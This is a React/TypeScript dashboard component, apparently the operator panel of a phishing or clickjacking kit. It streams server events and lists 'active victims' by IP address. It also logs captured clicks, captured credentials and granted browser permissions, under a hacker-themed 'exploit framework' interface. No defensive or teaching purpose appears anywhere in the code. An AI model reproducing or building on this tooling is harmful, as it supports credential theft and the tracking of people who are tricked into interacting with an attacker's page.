'use client'

import { useState, useEffect, useRef } from 'react'
import { Activity, AlertCircle, User } from 'lucide-react'

interface VictimData {
  id: string
  timestamp: string
  ip: string
  action: string
  data?: any
}

export default function RealtimeMonitor({ 
  onVictimUpdate, 
  onDataUpdate 
}: { 
  onVictimUpdate: (count: number) => void
  onDataUpdate: (updater: (prev: number) => number) => void 
}) {
  const [victims, setVictims] = useState<VictimData[]>([])
  const [logs, setLogs] = useState<string[]>([])
  const eventSourceRef = useRef<EventSource | null>(null)
  const logsEndRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    // Connect to SSE endpoint
    eventSourceRef.current = new EventSource('/api/stream')
    
    eventSourceRef.current.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data)
        handleIncomingData(data)
      } catch (error) {
        console.error('Failed to parse SSE data:', error)
      }
    }

    eventSourceRef.current.onerror = (error) => {
      console.error('SSE connection error:', error)
      addLog('[ERROR] Lost connection to victim')
    }

    return () => {
      eventSourceRef.current?.close()
    }
  }, [])

  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [logs])

  const handleIncomingData = (data: any) => {
    const timestamp = new Date().toLocaleTimeString()
    
    switch (data.type) {
      case 'victim_connected':
        addLog(`[${timestamp}] NEW VICTIM CONNECTED: ${data.ip}`)
        setVictims(prev => [...prev, {
          id: data.sessionId,
          timestamp,
          ip: data.ip,
          action: 'Connected',
        }])
        onVictimUpdate(victims.length + 1)
        break
        
      case 'click_captured':
        addLog(`[${timestamp}] CLICK CAPTURED at (${data.x}, ${data.y})`)
        break
        
      case 'credentials_captured':
        addLog(`[${timestamp}] CREDENTIALS CAPTURED: ${data.field}`)
        onDataUpdate((prev: number) => prev + 1)
        break
        
      case 'permission_granted':
        addLog(`[${timestamp}] PERMISSION GRANTED: ${data.permission}`)
        break
    }
  }

  const addLog = (message: string) => {
    setLogs(prev => [...prev.slice(-50), message])
  }

  return (
    <div className="terminal-window">
      <div className="terminal-header">
        <Activity className="w-4 h-4 text-green-400 animate-pulse" />
        <span className="text-sm">REAL-TIME MONITOR</span>
      </div>
      
      <div className="p-4">
        {/* Active Victims */}
        <div className="mb-4">
          <h3 className="text-sm text-hacker-green/70 mb-2">ACTIVE VICTIMS</h3>
          <div className="bg-black/50 rounded border border-hacker-green/20 p-2 max-h-32 overflow-y-auto">
            {victims.length === 0 ? (
              <div className="text-center text-hacker-green/50 py-4">
                Waiting for victims...
              </div>
            ) : (
              victims.map((victim, idx) => (
                <div key={idx} className="flex items-center justify-between text-xs py-1 border-b border-hacker-green/10 last:border-0">
                  <div className="flex items-center gap-2">
                    <User className="w-3 h-3 text-red-400" />
                    <span className="text-yellow-400">{victim.ip}</span>
                  </div>
                  <span className="text-hacker-green/50">{victim.timestamp}</span>
                </div>
              ))
            )}
          </div>
        </div>
        
        {/* Live Logs */}
        <div>
          <h3 className="text-sm text-hacker-green/70 mb-2">LIVE FEED</h3>
          <div className="bg-black rounded border border-hacker-green/20 p-3 h-64 overflow-y-auto font-mono text-xs">
            <div className="space-y-1">
              {logs.length === 0 ? (
                <div className="text-hacker-green/50">
                  <span className="animate-pulse">Initializing exploit framework...</span>
                </div>
              ) : (
                logs.map((log, idx) => (
                  <div 
                    key={idx} 
                    className={`${
                      log.includes('ERROR') ? 'text-red-400' :
                      log.includes('CAPTURED') ? 'text-yellow-400' :
                      log.includes('CONNECTED') ? 'text-green-400' :
                      'text-hacker-green/80'
                    }`}
                  >
                    {log}
                  </div>
                ))
              )}
              <div ref={logsEndRef} />
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}